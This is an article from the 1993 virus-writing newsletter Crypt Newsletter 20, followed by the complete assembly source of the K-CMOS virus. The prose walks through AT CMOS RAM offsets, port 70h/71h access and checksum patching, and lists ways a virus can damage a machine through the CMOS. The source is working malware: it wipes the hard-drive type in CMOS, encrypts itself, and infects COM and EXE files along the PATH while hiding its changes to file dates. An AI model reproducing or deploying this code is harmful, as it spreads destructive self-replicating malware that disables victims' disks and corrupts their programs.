comment $

                       K-CM”S VIRUS for Crypt Newsletter 20


             In my quest to bring the latest hi-tech computer virus
         toys to you, faithful reader, I have researched one of the
         relatively untouched-by-viruses parts of an AT computer: 
         the CMOS.

             The CMOS (Complementary Metal Oxide Semiconductor) is a
         low power consumption semiconductor where information such as
         the current equipment settings, hard drive type, time and
         date is stored and maintained using a NiCad battery that is
         recharged every time you turn on the computer. (That is why
         it's a good idea to turn on the computer every once in a while
         if you are not using it for long periods. This prevents
         battery discharge and loss of CMOS settings.)

             The CMOS in your computer is changed and set every time
         you run the Setup program that comes with your BIOS (AMI,
         Phoenix), and can be accessed and changed by any program
         running from DOS.

         The AT CMOS RAM is divided into three areas:

         1 - The clock/calendar bytes
         2 - The control registers
         3 - General purpose RAM.

         The following table  describes the CMOS RAM location and what
         each byte is used for:

OFFSET byte    DESCRIPTION

Real Clock Data

00        Current second in BCD
01        Alarm second in BCD
02        Current minute in BCD
03        Alarm minute in BCD
04        Current Hour in BCD
05        Alarm Hour in BCD
06        Current day of week in BCD
07        Current day in BCD
08        Current month in BCD
09        Current year in BCD

Status Registers

0A        Status Register A
0B        Status Register B
0C        Status Register C
0D        Status Register D

Configuration Data

0E         Diagnostic Status
                          Bit 7 - Clock Lost Power
                          Bit 6 - Bad CMOS checksum
                          Bit 5 - invalid config info at POST
                          Bit 4 - memory Size compare error at POST
                          Bit 3 - Fixed disk or adapter failed initialization
                          Bit 2 - Invalid CMOS time
                          Bits 1-0 - Reserved
0F         Reason for Shutdown
                          00 - Power on or reset
                          01 - Memory Size pass
                          02 - Memory test pass
                          03 - memory test fail
                          04 - POST end: boot system
                          05 - jmp doubleword pointer with EOI
                          06 - Protected tests pass
                          07 - Protected tests fail
                          08 - Memory size fail
                          09 - INT 15h Block move
                          0A - JMP double word pointer without EOI
10         Diskette Drive Types
                          Bits 7-4  - Diskette drive 0 type
                          Bits 3-0  - Diskette drive 1 type
                              0000b - no drive
                              0001b - 360K drive
                              0010b - 1.2MB drive
                              0011b - 720K drive
                              0100b - 1.44 MB drive
                              0101b - 2.88 MB drive
11         Reserved
12         Fixed Disk Drive Types
                          Bits 7-4  - Fixed Disk drive 0 type
                          Bits 3-0  - Fixed Disk drive 1 type
                              0000b - no drive
                          (Note: These drives do not necessarily
                           correspond with the values stored at
                           locations 19h and 1Ah)
13         Reserved
14         Equipment Installed
                          Bits 7-6  - # of Diskette drives
                                00b - 1 diskette drive
                                01b - 2 diskette drives
                          Bits 5-4  - Primary Display
                                00b - reserved
                                01b - 40 X 25 color
                                10b - 80 X 25 color
                                11b - 80 X 25 monochrome
                          Bits 3-0  - Reserved
15         Base Memory in 1K low byte
16         Base Memory in 1K high byte
17         Expansion Memory size low byte
18         Expansion Memory size high byte
19         Fixed Disk Drive Type 0
1A         Fixed Disk Drive Type 1
1B-2D      Reserved
2E         Configuration Data checksum high byte
2F         Configuration Data checksum low byte
30         Actual Expansion Memory size low byte
31         Actual Expansion Memory size high byte
32         Century in BCD
33         Information Flag
                          Bit 7 - 128 Kbyte expanded
                          Bit 6 - Setup Flag
                          Bits 5-0 - Reserved
34-3F      Reserved



             As you can see, there are a total of 63 (3F hex) bytes of
         CMOS RAM, with 33 bytes used as 'reserved' memory in the
         three areas;  these locations are not currently defined by
         the AT BIOS and might be used to store data that will be
         restored after power is shut down.

         The 4 status registers (A through D) located, appropriately, at
         locations 0Ah through 0Dh define the chips operating
         parameters and provide information about interrupts and the
         state of the real time clock chip (RTC).

         With very few restrictions all CMOS RAM locations may be
         directly accessed by an application.
         
         Program locations 11h, 13h, and 1Bh through 2Dh are used
         in calculating the CMOS checksum that the BIOS stores at
         locations 2Eh and 2Fh.
         
         Note: If a program changes ANY bytes at locations 10h 
         through 2Dh it must also recalculate the checksum and store 
         the new value.  Changing these bytes (10h -> 2Dh) without 
         correcting the checksum results in a 'CMOS checksum error' 
         forcing you to run the BIOS setup and reenter all of the CMOS
         information.
         
         The reserved memory locations 34h through 3Fh are not used in
         checksum calculations and may be changed with extreme caution
         since different BIOS versions, manufacturers and hardware
         configurations use this reserved CMOS RAM locations for
         extended system setup information including BIOS passwords
         and DMA settings.


         To access and change a computer's CMOS RAM is very simple:

         Access is done through ports 70 hex (CMOS control/address)
         and port 71 hex (CMOS data).

         The process is thus:

         1 - We specify the CMOS RAM address of the byte we want to
             read or write using port 70h

         EXAMPLE:

         mov  al,XX   where XX = byte specifying the address (00h->3Fh)
         out  70h,al

         2 - We read or write a byte to the address specified in step
             1.

         READ EXAMPLE:

         in  al,71h   byte at location XX goes into AL

         WRITE EXAMPLE:

         out  71h,al  byte in AL goes to location XX in the CMOS RAM

         There is one little problem: if we are writing to any of the
         locations that are checksummed (10h through 2Dh), we must
         change the checksum value as well; so we follow steps 1 and 2
         with the checksum values at locations 2Eh and 2Fh, combine
         the bytes into one register and subtract the current byte
         value from the register containing the checksum. Then we add
         the value of the new byte to be put in the CMOS RAM to the
         register that has the checksum, and we write the checksum,
         and the new byte to the CMOS.
         
         While all of this might seem too complicated, I have
         written a mini-CM”S toolkit, a routine that takes the address
         and the new value of the byte to be put in the CMOS, and does
         the dirty work of putting the values and of changing the
         checksum for you.

         Read the code carefully. It will make everything become
         clearer.

;==============================================================================
CMOS_CHCKSM:

; INPUT:
; DL = CMOS ADDRESS of BYTE TO be MODiFiED
; BL = NEW BYTE VALUE to be PUT IN CMOS RAM

; OUTPUT:
; None.
; REGISTERS USED: AX,CX,BX,DX

;*************************
; GET CMOS Checksum => CX
;*************************

        xor     ax,ax
        mov     al,2Eh           ;msb of checksum address
        out     70h,al           ;send address / control byte
        in      al,71h           ;read byte

        xchg    ch,al            ;store al in ch

        mov     al,2Fh           ;lsb of checksum address
        out     70h,al           ;send address / control byte
        in      al,71h           ;read byte

        xchg    cl,al            ;store lsb to cl

;*********************
; Fix CMOS Checksum
;*********************

        push    dx
        xchg    dl,al           ;AL = address
        out     70h,al          ;send address / control byte
        in      al,71h          ;read register

        sub     cx,ax           ;subtract from checksum

        add     cx,bx           ;update checksum value in register.

;****************************
; Write CMOS byte to Address
;****************************

        pop     dx
        xchg    dl,al           ;AL = address
        out     70h,al          ;specify CMOS address
        xchg    al,bl           ;new CMOS value => al

        out     71h,al          ;write new CMOS byte

;*********************
; Write CMOS Checksum
;*********************

        mov     al,2Eh          ;address of checksum 's msb
        out     70h,al          ;specify CMOS address
        xchg    al,ch           ;msb of new checksum

        out     71h,al          ;write new CMOS msb

        mov     al,2Fh          ;address of checksum 's lsb
        out     70h,al          ;specify CMOS address
        xchg    al,cl           ;lsb of new checksum

        out     71h,al          ;write new CMOS lsb
        ret

;==============================================================================


             It is worth mentioning that for XT (8088) type computers
         the CMOS routine will have no adverse effects in the
         execution of the virus-infected program.

             There are many intriguing features of CMOS-attacking 
         viruses: The biggest one is the interaction between software
         and CMOS is not stopped by common anti-virus memory
         resident programs. The most talked about example of such
         a virus is the South African EXEbug, which uses CMOS
         manipulation to make itself difficult to remove from an
         infected hard disk. EXEbug massages the CMOS so that if
         the machine is booted from a diskette and the virus is
         not in memory, the infected hard disk is not recognized.

         The list of possible problems created by a CMOS
         attacking virus is long:

         1 - CMOS checksum errors.
         This will force the user to reenter all of the CMOS data.
         Change any value in the correct CMOS range without
         updating the checksum.

         2 - Dead disk / hard drives.
         This could drive the uninformed to presume they have
         encountered a hardware problem.

         3 - Changed hardrive types, horrendous hardrive problems.
         For example: Input the hardrive type byte, subtract some small
         digit from it and output the byte to the CMOS. (The checksum
         must be fixed!) and a horrible mess results on subsequent
         boot up.

         4 - Changed dates, times, etc.
         The uninformed could thing the Nicad battery has died,
         or that his/her computer is possessed by evil, Nigerian
         Deities.

         5 - Changed BIOS passwords, inability to access a computer.
         On newer AMI BIOSes you can set or change the password
         required to access the computer.  This topic was discussed
         briefly in a recent issue of Virus News International, the 
         upshot being that the unsuspecting could be flummoxed into
         throwing the computer out the window, or more realistically,
         calling a technician. In the case where some knowledge about 
         computers is present, the case is opened and the jumper
         found to short the CMOS. (No, you don't have to disconnect 
         the battery.  And you didn't throw out your machine manuals
         did you?)

             Although many anti-virus programs can save and restore
         your CMOS values as part of their function, currently there 
         is only one memory resident program that checks for changes 
         in the CMOS: Thunderbyte's TBMEM.

             This month's example, K-CM”S, falls in category #2: it
         kills all fixed disk drives by zeroing out location 12h in
         the CMOS RAM. It also has some encryption abilities (a 16
         byte constant decryptor) and a PATH style infection routine
         that actually works!
         
         Needless to say, careful handling is necessary as it can
         spread quite rapidly.

         Important: Since K-CMOS zero's the CMOS value for the fixed
         disk on execution, unless you restore the value before ending
         your experiment with some software CMOS reloading tool, you
         will have a dead C: drive when you finally get around to
         rebooting.  Keep in mind that if you don't know how to reset
         your CMOS on power up using the built in BIOS setup, you will
         sit there in a dumb stew wondering why you ran a virus which
         unhooked your hard drive.

         To prevent this from happening, you must familiarize yourself
         with the BIOS setup program. Here is a brief walkthrough which
         could be used to properly restore your machine after K-CMOS
         has altered your CMOS:
         
         1 - BEFORE you execute K-CMOS - on power up, bring up your 
         BIOS setup by holding down the DEL key while you are booting 
         the computer. 
         
         2 - You will probably see a screen with a number of selections.
         You will want to bring up "Change Basic CMOS Settings" or its
         equivalent. Write down the values for the HD types on drives 
         C and D.

         3- IF the hard drive types are "47" the you MUST record all 
         of the data in the displayed fields, i.e, the information 
         such as the number of heads, sectors, etc. Again, you MUST 
         do this BEFORE you run K-CMOS or you will have to look in 
         your manuals somewhere to get the specific HD information!

         NOTE: Newer AMI BIOSes have an auto-detect feature in the 
         Setup menu, so you might not have to worry about hard disk type 
         number, number of sectors, number of heads, etc., if you have 
         the feature in your computer's BIOS. The setup will do the 
         work for you.

         4 - Now that you've recorded this data, you can test K-CMOS
         and watch it unhook your system.  On reboot, you will lose the
         hard disk.  Reboot, bring up your Setup program as above, re-
         enter the values for the hard disk which you previously 
         recorded, exit and save.  You are back in business.

         Enjoy!

$

;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
;                                K-CM”S.ASM
;                            AUTHOR:  K”hntark
;                           DATE:    November 93
;                           Size: <  1100 bytes
;
;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

MAIN    SEGMENT BYTE
        ASSUME cs:main,ds:main,ss:nothing      ;all part in one segment=com file
        ORG    100h

;**********************************
;  fake host program
;**********************************

HOST:
        db    0E9h,0Ah,00          ;jmp    NEAR PTR VIRUS
        db     ' '
        db     90h,90h,90h
        mov    ah,4CH
        mov    al,0
        int    21H                 ;terminate normally with dos

;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ

;**********************************
; VIRUS CODE STARTS HERE
;**********************************

VIRUS:

      mov si,010Dh                            ;get starting address

;************************************
; Fix DS ES
;************************************

   mov  al,cs:BYTE PTR [si + COM_FLAG - VIRUS]   ;save COM/EXE flag in AX
   mov  WORD PTR cs:[si + PSP_SEG - VIRUS],es    ;save PSP segment for use in PATH search
   push ax                                       ;save COM/EXE flag
   push es                                       ;save es and ds in case file is EXE
   push ds

   push cs
   push cs
   pop  es                                    ;es = cs
   pop  ds                                    ;ds = cs

   push WORD PTR [si + ORIG_IPCS - VIRUS]       ;save IP
   push WORD PTR [si + ORIG_IPCS - VIRUS + 2]   ;save CS

   push WORD PTR [si + ORIG_SSSP - VIRUS]       ;save SS
   push WORD PTR [si + ORIG_SSSP - VIRUS + 2]   ;save SP

   push WORD PTR [si + START_CODE - VIRUS]
   push WORD PTR [si + START_CODE - VIRUS + 2]

;************************************
; redirect DTA onto virus code
;************************************

   lea  dx,[si + DTA - VIRUS] ;put DTA at the end of the virus for now
   mov  ah,1ah                ;set new DTA function to ds:dx
   int  21h

;************************************
; KIll fixed disk drives in CMOS
;************************************

        mov     dx,0012h        ;hard drive type register
        xor     bx,bx           ;New hard drive type = 0 (No Fixed drive)
        call    CMOS_CHCKSM

;************************************
; MAIN Routines called from here
;************************************

          lea  bp,[si + COM_MASK - VIRUS]
          call FIND_FILE                  ;get a com file to attack!
          lea  bp,[si + EXE_MASK - VIRUS]
          call FIND_FILE                  ;get an exe file to attack!

;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ

EXIT_VIRUS:

;************************************
; set old  DTA  address
;************************************

           mov ah,1ah
           mov dx,80h            ;fix dta back to ds:dx
           int 21h               ;host program

           pop WORD PTR [si + START_CODE - VIRUS + 2]
           pop WORD PTR [si + START_CODE - VIRUS]

           cli
           pop WORD PTR [si + ORIG_SSSP - VIRUS + 2]   ;save SP
           pop WORD PTR [si + ORIG_SSSP - VIRUS]       ;save SS
           sti

           pop WORD PTR [si + ORIG_IPCS - VIRUS + 2]   ;save CS
           pop WORD PTR [si + ORIG_IPCS - VIRUS]       ;save IP

           pop ds                ;restore ds
           pop es                ;restore es
           pop ax                ;restore COM_FLAG

           cmp  al,00            ;com infection?
           je  RESTORE_COM

;************************************
; restore EXE.. and exit..
;************************************

   mov  bx,ds                                       ;ds has to be original one
   add  bx,low 10h
   mov  cx,bx
   add  bx,cs:WORD PTR [si + ORIG_SSSP - VIRUS]     ;restore ss
   cli
   mov  ss,bx
   mov  sp,cs:WORD PTR [si + ORIG_SSSP - VIRUS + 2] ;restore sp
   sti
   add  cx,cs:WORD PTR [si + ORIG_IPCS - VIRUS+ 2]
   push cx                                          ;push cs
   push cs:WORD PTR [si + ORIG_IPCS - VIRUS]        ;push ip
   db  0CBh                                         ;retf

;************************************
; restore 4 original bytes to file
;************************************

RESTORE_COM:
           push si                                   ;save si
           cld                                       ;clear direction flag
           add  si,OFFSET START_CODE -  OFFSET VIRUS ;source:   ds:si
           mov  di,0100h                             ;destination: es:di
           movsw                                     ;shorter & faster than
           movsw                                     ;mov cx,04  and rep movsb
           pop  si                                   ;restore si

;****************************************************************
; zero out registers for return to
; host program
;****************************************************************

 mov  ax,0100h     ;return address
 xor  bx,bx
 xor  cx,cx
 xor  si,si
 xor  di,di
 push ax
 xor  ax,ax
 cwd
 ret

;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ

NO_GOOD:     stc
             jmp GET_OUT

QUICK_EXIT:  stc                                     ;set carry flag
             ret

;-----------------------------------------------------------------------------

CHECK_N_INFECT_FILE:

;******************
; 1-Check TIME ID
;******************

       mov cx,WORD PTR [si + DTA_File_TIME - VIRUS]   ;file time from DTA
       and cl,1Dh                                     ;58 seconds?
       cmp cl,1Dh
       je  QUICK_EXIT

;*********************************************
; 2-Clear attributes
;*********************************************

       lea dx,[si + WORK_AREA - VIRUS]        ;dx=ptr to path + current filename
       xor cx,cx                              ;set attributes to normal
       mov ax,4301h                           ;set file attributes to cx
       int 21h                                ;int 21h
       jc  QUICK_EXIT                         ;error.. quit

;*****************
; 3-OPEN FILE
;*****************

       mov  ax,3D02h                        ;r/w access to it
       int  21h
       jc   NO_GOOD                         ;error.. quit
       xchg ax,bx                           ;bx = file handle

;********************
; 4-Read 1st 28 bytes
;********************

       mov  cx,28d                        ;read first 5 bytes of file
       lea  dx,[si + START_CODE - VIRUS]  ;store'em here
       mov  ah,3Fh                        ;DOS read function
       int  21h
       jc   NO_GOOD                       ;error? get next file

;*********************
; 5-CHECK FILE
;*********************

       cmp  WORD PTR [si + START_CODE - VIRUS],'ZM'   ;EXE file?
       je   CHECK_EXE                                 ;no? check com

       cmp  WORD PTR [si + START_CODE - VIRUS],'MZ'  ;EXE file?
       je   CHECK_EXE                                ;no? check com

CHECK_COM:
            mov  ax,WORD PTR [si + DTA_File_SIZE - VIRUS] ;get file's size
            push ax                                       ;insert new entry point just in case..
            add  ax,100h + DECRYPTOR_SIZE
            mov  WORD PTR [si + 1],ax
            pop  ax

            add  ax,OFFSET FINAL - OFFSET VIRUS            ;add virus size to it
            jc   NO_GOOD                                   ;bigger then 64K:nogood

            cmp  BYTE PTR [si + START_CODE - VIRUS],0E9H   ;compare 1st byte to near jmp
            jne  short INFECT_COM                          ;not a near jmp, file ok

            cmp  BYTE PTR [si + START_CODE+3 - VIRUS],20h  ;check for ' '
            je   NO_GOOD                                   ;file ok .. infect
            jmp  short  INFECT_COM


CHECK_EXE:
            cmp  WORD PTR [si + START_CODE - VIRUS + 18h],40h   ;Windows file?
            je   NO_GOOD                                        ;no? check com

            cmp  WORD PTR [si + START_CODE - VIRUS + 01Ah],0   ;internal overlay
            jne  NO_GOOD                                       ;yes? exit..

            cmp  WORD PTR [si + START_CODE - VIRUS + 12h],ID   ;already infected?
            je   NO_GOOD

INFECT_EXE:
             mov BYTE PTR [si+ COM_FLAG - VIRUS],01  ;exe infection
             jmp short SKIP

INFECT_COM:
             mov BYTE PTR [si+ COM_FLAG - VIRUS],00  ;com infection

SKIP:

;*********************
; 6-set PTR @EOF
;*********************

        xor  cx,cx                  ;prepare to write virus on file
        xor  dx,dx                  ;position file pointer,cx:dx = 0
       ;cwd                         ;position file pointer,cx:dx = 0
        mov  ax,4202H
        int  21h                    ;locate pointer at end EOF DOS function

;*********************
; 7-Fix deCRYPTtor
;*********************

        push ax                                         ;save file size (COM file, for EXE files
                                                        ;this is redone later)
        add  ax,100h + DECRYPTOR_SIZE
        mov  WORD PTR [si + WORK_BUFFER - VIRUS + 4],ax ;insert address
        mov  ax,(OFFSET FINAL - OFFSET VIRUS)/2         ;virus size in Words
        mov  WORD PTR [si + WORK_BUFFER - VIRUS + 1],ax ;insert size

        in    al,40h                                    ;get a random word in AX
        xchg  ah,al
        in    al,40h
        xor   ax,0813Ch
        add   ax,09249h
        rol   al,1
        ror   ah,1

        mov  WORD PTR [si + WORK_BUFFER - VIRUS + 9],ax ;insert random KEY
        pop  ax                                         ;restore file size


        cmp BYTE PTR [si+ COM_FLAG - VIRUS],01 ;exe file?
        jne DO_COM

;*************************
; 8-FIX AND WRITE EXE HDR
;*************************

        push bx                                ;save file handler

;-----------------------
; save CS:IP & SS:SP
;-----------------------

        push si
        cld                                    ;clear direction flag
        lea di,[si + ORIG_SSSP - VIRUS]        ;save original CS:IP at es:di
        lea si,[si + START_CODE - VIRUS + 14d] ;from ds:si
        movsw                                  ;save ss
        movsw                                  ;save sp

        add si,02                              ;save original SS:SP
        movsw                                  ;save ip
        movsw                                  ;save cs
        pop si

;-----------------------------
; calculate new CS:IP
;-----------------------------

        mov  bx,WORD PTR[si + START_CODE - VIRUS + 8] ;header size in paragraphs
        mov  cl,04                                    ;multiply by 16, won't work with headers > 4096
        shl  bx,cl                                    ;bx=header size

        push ax                                       ;save file size at dx:ax
        push dx

        sub  ax,bx                                    ;file size - header size
        sbb  dx,0000h                                 ;fix dx if carry, assures dx, ip < 16

        call CALCULATE

        mov  WORD PTR [si+ START_CODE - VIRUS + 12h],ID   ;put ID in checksum slot
        mov  WORD PTR [si+ START_CODE - VIRUS + 14h],ax   ;IP
        add  ax,DECRYPTOR_SIZE
        mov  WORD PTR [si+1],ax                           ;insert new starting address
        mov  WORD PTR [si + WORK_BUFFER - VIRUS + 4],ax   ;insert address on decryptor
        mov  WORD PTR [si+ START_CODE - VIRUS + 16h],dx   ;CS

;-----------------------------
; calculate & fix new SS:SP
;-----------------------------

        pop dx
        pop ax ;filelength in dx:ax

        add ax,OFFSET FINAL - OFFSET VIRUS ;add filesize to ax
        adc dx,0000h                       ;fix dx if carry

        push ax
        push dx
        add  ax,40h   ;if filesize + virus size is even then the stack size
        test al,01    ;even or odd stack?
        jz   EVENN
        inc  ax       ;make stack even
EVENN:
        call CALCULATE

        mov  WORD PTR [si+ START_CODE - VIRUS + 10h],ax ;SP
        mov  WORD PTR [si+ START_CODE - VIRUS + 0Eh],dx ;SS

;-----------------------------
; Calculate new file size
;-----------------------------

        pop dx
        pop ax

        push  ax
        mov   cl,0009h                       ;2^9 = 512
        ror   dx,cl                          ;/ 512 (sort of)
        shr   ax,cl                          ;/ 512
        stc                                  ;set carry flag
        adc   dx,ax                          ;fix dx , page count
        pop   cx
        and   ch,0001h                       ;mod 512

        mov  WORD PTR [si+ START_CODE - VIRUS + 4],dx ;page count
        mov  WORD PTR [si+ START_CODE - VIRUS + 2],cx ;save remainder

        pop  bx      ;restore file handle

DO_COM:

;*********************
; 9-write deCRYPTor
;*********************

       lea   dx,[si + WORK_BUFFER - VIRUS]  ;write from here
       mov   cx,DECRYPTOR_SIZE              ;write # of bytes
       mov   ah,40h                         ;write to file bx=file handle
       int   21h                            ;write from DS:DX

;*********************
; 10-enCRYPT virus
;*********************

       push  ds                                         ;save DS
       push  es                                         ;save ES
       mov   ax,0A00h                                   ;set up new ES (work) segment
       push  ax
       pop   es                                         ;ES=AX=0A00h
       xor   di,di                                      ;DI=0
       mov   cx,(OFFSET FINAL - OFFSET VIRUS)/2         ;virus size cx= # words
       push  si                                         ;save SI
       mov   dx,WORD PTR [si + WORK_BUFFER - VIRUS + 9] ;get Random KEY in DX

enCRYPT:
       lodsw          ;word ptr ds:[si] => ax
       sub   ax,dx    ;encrypt ax
       stosw          ;ax => word ptr es:[di]
       loop  enCRYPT

       pop   si       ;restore SI
       xor   dx,dx    ;DX=0
       push  es
       pop   ds       ;DS=ES

;*********************
; 11-Write Virus
;*********************

        mov  cx,OFFSET FINAL - OFFSET VIRUS      ;write virus  cx= # bytes
        mov  ah,40h                              ;write to file bx=file handle
        int  21h                                 ;write from DS:DX

        pop  es                                  ;restore ES
        pop  ds                                  ;restore DS

;*********************
; 12-set PTR @BOF
;*********************

        mov  ax,4200h                            ;locate pointer at beginning of
        xor  cx,cx
        xor  dx,dx                               ;position file pointer,cx:dx = 0
       ;cwd                                      ;position file pointer,cx:dx = 0
        int  21h                                 ;host file

        cmp BYTE PTR [si+ COM_FLAG  - VIRUS],01  ;exe file?
        jne DO_COM2

;*********************
; 13-Write EXE Header
;*********************

        mov  cx,28d                               ;#of bytes to write
        lea  dx,[si + START_CODE - VIRUS]         ;ds:dx=pointer of data to write
        jmp  short CONT

;****************************************************
; 14-write new 4 bytes to beginning of file (COM)
;***************************************************

DO_COM2:
        mov  ax,WORD PTR [si + DTA_File_SIZE - VIRUS]
        sub  ax,3
        mov  WORD PTR [si + START_IMAGE + 1 - VIRUS],ax

        mov  cx,4                                 ;#of bytes to write
        lea  dx,[si + START_IMAGE - VIRUS]        ;ds:dx=pointer of data to write

CONT:
        mov  ah,40h                               ;DOS write function
        int  21h                                  ;write 5 / 28 bytes

;*************************************************
; 15-Restore date and time of file to be infected
;*************************************************

        mov  ax,5701h
        mov  dx,WORD PTR [si + DTA_File_DATE - VIRUS]
        mov  cx,WORD PTR [si + DTA_File_TIME - VIRUS]
        and  cx,0FFE0h                             ;mask all but seconds
        or   cl,1Dh                                ;seconds to 58
        int  21h

GET_OUT:
;****************
; 16-Close File
;****************

        pushf                          ;save flags to return on exit
        mov  ah,3Eh
        int  21h                       ;close file

;*************************************************
; 17-Restore file's attributes
;*************************************************

       mov ax,4301h                                  ;set file attributes to cx
       lea dx,[si + WORK_AREA - VIRUS]               ;dx=ptr to path + current filename
       xor cx,cx
       mov cl,BYTE PTR [si + DTA_File_ATTR - VIRUS]  ;get old attributes
       int 21h
       popf                                          ;restore flags to return on exit
       ret                                           ;infection done!

;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ

CALCULATE:
        mov cl,0Ch
        shl dx,cl     ;dx * 4096
        mov bx,ax
        mov cl,4
        shr bx,cl     ;ax / 16
        add dx,bx     ;dx = dx * 4096 + ax / 16 =SS CS
        and ax,0Fh    ;ax = ax and 0Fh          =SP IP
        ret

;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ

FIND_FILE:
             push  si
             push  es
             mov   es,es:WORD PTR [si + PSP_SEG - VIRUS] ;es=saved PSP segment
             mov   es,es:2ch                             ;es:di points to environment
             xor   di,di
             mov   bx,si
FIND_PATH:
            lea   si,[bx + PATH_STR - VIRUS]  ;source :ds:si = 'P'
            lodsb                             ;load 'P'
            mov   cx,7FFFh                    ;size of environment= 32768 bytes
            not   cx                          ;cx=8000h
            repne scasb                       ;find 'P' in es:di
            mov cx,4

CHECK_NEXT_4:
               lodsb                   ;check for 'ATH'
               scasb
               jne  FIND_PATH
               loop CHECK_NEXT_4

               mov WORD PTR [bx + PATH_ADDRESS - VIRUS],di            ;save path's address es:di
               lea di,[bx + WORK_AREA - VIRUS]
               pop es                                                 ;restore PSP segment
               jmp short COPY_FILE_SPEC_TO_WORK_AREA

NO_FILE_FOUND:
                cmp word ptr [bx + PATH_ADDRESS - VIRUS],0 ;has path string ended?
                jne FOLLOW_THE_PATH                        ;if not there are more subdirs
                jmp EXIT                                   ;path string ended.. exit

FOLLOW_THE_PATH:
                 lea di,[bx + WORK_AREA - VIRUS]              ;destination es:di = work area
                 mov si,WORD PTR [bx + PATH_ADDRESS - VIRUS]  ;source      ds:si = Environment
                 mov ds,WORD PTR [bx + PSP_SEG - VIRUS]       ;ds=PSP segment
                 mov ds,ds:2ch                                ;ds:si points to environment

UP_TO_LODSB:
                 lodsb                               ;get character
                 xchg cx,ax                          ;he he
                 cmp cl,';'                          ;is it a ';'?
                 xchg cx,ax                          ;he he
                 je SEARCH_AGAIN
                 cmp al,0                            ;end of path string?
                 je CLEAR_SI
                 stosb                               ;save path marker into di
                 jmp SHORT UP_TO_LODSB

CLEAR_SI:        ;mark the fact that we are looking thru the final subdir
                  xor si,si

SEARCH_AGAIN:
                  mov WORD PTR cs:[bx + PATH_ADDRESS - VIRUS],si ;save address of next subdir
                  cmp BYTE PTR cs:[di-1],'\'                     ;ends with a '\'?
                  je COPY_FILE_SPEC_TO_WORK_AREA
                  mov al,'\'                                     ;add '\' if not
                  stosb

;***********************************************
; put *.COM / *.EXE into workspace
;***********************************************

COPY_FILE_SPEC_TO_WORK_AREA:
                  push cs
                  pop  ds                                      ;ds=cs
                  mov  WORD PTR [bx + FILENAME_PTR - VIRUS],di ;es:di = WORK_AREA
                  mov  si,bp                                   ;bp=file spec
                  mov  cx,3                                    ;length of *.com0/ *.EXE0
                  rep  movsw                                   ;move *.COM0/ *.EXE0 to workspace

;************************************************
; Find FIRST FILE
;************************************************

                  mov ah,04EH                     ;DOS function
                  lea dx,[bx + WORK_AREA - VIRUS] ;dx points to path in workspace
                  mov cx,3Fh                      ;attributes RO or hidden OK
FIND_NEXT_FILE:   int 21H
                  jnc FILE_FOUND
                  jmp short NO_FILE_FOUND

FILE_FOUND:
             mov di,WORD PTR [bx + FILENAME_PTR - VIRUS] ;destination: es:di
             lea si,[bx + DTA_File_NAME - VIRUS]         ;origin       ds:si

MOVE_ASCII_FILENAME:
                      lodsb                    ;move filename to the end of path
                      stosb
                      cmp al,0                 ;end of ASCIIZ string?
                      jne MOVE_ASCII_FILENAME  ;keep on going
                      pop si                   ;restore si to use in the following
                      push bp                  ;save COM / EXE string pointer
                      call CHECK_N_INFECT_FILE ;check file if file found
                      pop  bp                  ;restore COM / EXE string pointer
                      jnc  EXITX
                      mov  bx,si               ;fix bx
                      push si                  ;save si again
                      mov ah,04Fh
                      jmp short FIND_NEXT_FILE

EXIT:
                      pop  si
EXITX:
                      ret

;==============================================================================
CMOS_CHCKSM:

; INPUT:
; DL = CMOS ADDRESS of BYTE TO be MODiFiED
; BL = NEW BYTE VALUE to be PUT IN CMOS RAM

; OUTPUT:
; None.
; REGISTERS USED: AX,CX,BX,DX

;*************************
; GET CMOS Checksum => CX
;*************************

        xor     ax,ax
        mov     al,2Eh           ;msb of checksum address
        out     70h,al           ;send address / control byte
        in      al,71h           ;read byte

        xchg    ch,al            ;store al in ch

        mov     al,2Fh           ;lsb of checksum address
        out     70h,al           ;send address / control byte
        in      al,71h           ;read byte

        xchg    cl,al            ;store lsb to cl

;*********************
; Fix CMOS Checksum
;*********************

        push    dx
        xchg    dl,al           ;AL = address
        out     70h,al          ;send address / control byte
        in      al,71h          ;read register

        sub     cx,ax           ;subtract from checksum

        add     cx,bx           ;update checksum value in register.

;****************************
; Write CMOS byte to Address
;****************************

        pop     dx
        xchg    dl,al           ;AL = address
        out     70h,al          ;specify CMOS address
        xchg    al,bl           ;new CMOS value => al

        out     71h,al          ;write new CMOS byte

;*********************
; Write CMOS Checksum
;*********************

        mov     al,2Eh          ;address of checksum 's msb
        out     70h,al          ;specify CMOS address
        xchg    al,ch           ;msb of new checksum

        out     71h,al          ;write new CMOS msb

        mov     al,2Fh          ;address of checksum 's lsb
        out     70h,al          ;specify CMOS address
        xchg    al,cl           ;lsb of new checksum

        out     71h,al          ;write new CMOS lsb
        ret

;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ

NAME_AUTHOR     db  'K-CM”S / K”hntark'

WORK_BUFFER     db  0B9h,00,00                     ;mov  cx,VSIZE
                db  0BBh,00,00                     ;mov  si,VADDRESS
                db  02Eh,081h,07,00,00             ;add WORD PTR cs:[si],KEY
                db  083h,0C3h,02                   ;add si,02
               ;db  043h,043h                      ;inc bx, inc bx
                db  0E2h,0F6h                      ;loop add..

COM_MASK        db  '*.COM',0
EXE_MASK        db  '*.EXE',0
PATH_STR        db  'PATH=',0

START_IMAGE     db  0E9h,0,0,020h

ORIG_SSSP       dw  0,0
ORIG_IPCS       dw  0,0
COM_FLAG        db  0                   ;0=COM 1=EXE
START_CODE      db  4 dup (90h)         ;4 bytes of COM or EXE hdr goes here

;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ

FINAL:                ;label of byte of code to be kept in virus when it moves

;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ

HEAP:

START_CODE2      db  24d dup (0)         ;2nd part of EXE hdr

PSP_SEG         dw  0

